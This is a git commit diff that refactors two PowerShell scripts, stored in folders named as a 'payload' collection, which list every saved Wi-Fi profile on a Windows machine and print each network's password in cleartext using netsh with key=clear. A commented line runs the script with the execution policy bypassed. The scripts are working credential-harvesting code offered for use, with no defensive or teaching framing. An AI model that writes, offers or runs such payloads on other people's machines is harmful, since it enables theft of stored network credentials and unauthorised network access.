e7849c676b5a923745cbe1d95e7ea9379e1bd562
RevoVog <vihanga.vog@gmail.com>
2025-09-03 02:36:40 +0530

    Refactor Wi-Fi credential retrieval scripts for consistency and clarity

--- Payload take wifi credentials/wifi.ps1
+++ Payload take wifi credentials/wifi.ps1
@@ -1,12 +1,9 @@
-netsh wlan show profile |
-    Select-String '(?<=All User Profile\s+:\s).+' |
-    ForEach-Object {
-        $wlan = $_.Matches.Value
-        $passw = netsh wlan show profile $wlan key=clear |
-            Select-String '(?<=Key Content\s+:\s).+'
-
-        [pscustomobject]@{
-            Name     = $wlan
-            Password = $passw.Matches.Value
+netsh wlan show profiles |
+  Select-String '(?<=All User Profile\s+:\s).+' |
+  ForEach-Object {
+      $SSID = $_.Matches.Value
+      $passw = netsh wlan show profile name="$SSID" key=clear
+      echo "SSID: $SSID"
+      echo $passw | Select-String '(Key Content\s+:\s).+'
+      echo ""
         }
-    }
--- Powershell No Admin/08-Netsh_wifi_pass.ps1
+++ Powershell No Admin/08-Netsh_wifi_pass.ps1
@@ -1,15 +1,26 @@
-netsh wlan show profile |
-    Select-String '(?<=All User Profile\s+:\s).+' |
-    ForEach-Object {
-        $wlan = $_.Matches.Value
-        $passw = netsh wlan show profile $wlan key=clear |
-            Select-String '(?<=Key Content\s+:\s).+'
+# netsh wlan show profile |
+#     Select-String '(?<=All User Profile\s+:\s).+' |
+#     ForEach-Object {
+#         $wlan = $_.Matches.Value
+#         $passw = netsh wlan show profile $wlan key=clear |
+#             Select-String '(?<=Key Content\s+:\s).+'
 
-        [pscustomobject]@{
-            Name     = $wlan
-            Password = $passw.Matches.Value
+#         [pscustomobject]@{
+#             Name     = $wlan
+#             Password = $passw.Matches.Value
+#         }
+#     }
+
+netsh wlan show profiles |
+  Select-String '(?<=All User Profile\s+:\s).+' |
+  ForEach-Object {
+      $SSID = $_.Matches.Value
+      $passw = netsh wlan show profile name="$SSID" key=clear
+      echo "SSID: $SSID"
+      echo $passw | Select-String '(Key Content\s+:\s).+'
+      echo ""
         }
-    }
+
 
 #powershell.exe -ExecutionPolicy Bypass -File "08-Netsh_wifi_pass.ps1"
 
